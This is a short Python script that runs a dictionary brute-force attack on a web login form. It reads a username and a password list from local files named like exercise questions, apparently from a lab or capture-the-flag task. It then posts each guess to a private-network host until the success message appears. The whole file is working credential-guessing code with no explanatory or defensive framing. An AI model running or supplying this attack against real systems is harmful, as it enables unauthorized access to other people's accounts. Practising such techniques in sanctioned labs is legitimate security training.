import requests

def try_login(username, password):
    payload = {"username": username, "password": password, "submit": "submit"}
    response = requests.post("http://10.13.4.80:80", data=payload)
    return (f"You Logged In as {username}!!" in response.text)

if __name__ == "__main__":
    with open("../Q1", "r") as f:
        username = f.read().rstrip("\n")
    with open("../Q2dictionary.txt", "r") as f:
        passwords = f.read().rstrip("\n").split("\n")

    for i, password in enumerate(passwords):
        if try_login(username, password):
            print(f"Password: {password}")
            break
        if i % 100 == 0:
            print(f"{i} / {len(passwords)}\r", end="")
    else:
        print(f"Failed to find password.")
